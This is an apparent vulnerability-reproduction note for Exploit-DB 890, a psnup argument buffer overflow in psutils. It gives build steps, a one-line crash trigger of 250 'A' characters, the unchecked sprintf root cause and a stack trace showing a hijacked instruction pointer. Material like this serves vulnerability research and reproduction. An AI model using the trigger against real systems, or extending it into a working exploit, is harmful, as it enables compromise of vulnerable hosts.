# EDB-890

## Experiment Environment

CentOS 6.4

## INSTALL & Configuration

```
wget https://github.com/mudongliang/source-packages/raw/master/EDB-890/psutils-p17.tar.gz

tar -xvf psutils-p17.tar.gz
cd psutils

./configure
make
```

## Problems in Installation & Configuration

Change

```
PERL = /usr/local/bin/perl
```

to

```
PERL = /usr/bin/perl

```

## How to trigger vulnerability

```
./psutils/psnup -8 `perl -e 'print "A"x250'`
```

## PoCs

[PostScript Utilities - psnup Argument Buffer Overflow](https://www.exploit-db.com/exploits/890/)

## Vulnerability Details & Patch

### Root Cause

```
pserror.c:82

              sprintf(bufptr, fmtbuf, s) ;
```

### Stack Trace

```
(gdb) info stack
#0  0x41414141 in ?? ()
#1  0x41414141 in ?? ()
#2  0x41414141 in ?? ()
#3  0x41414141 in ?? ()
```

## References
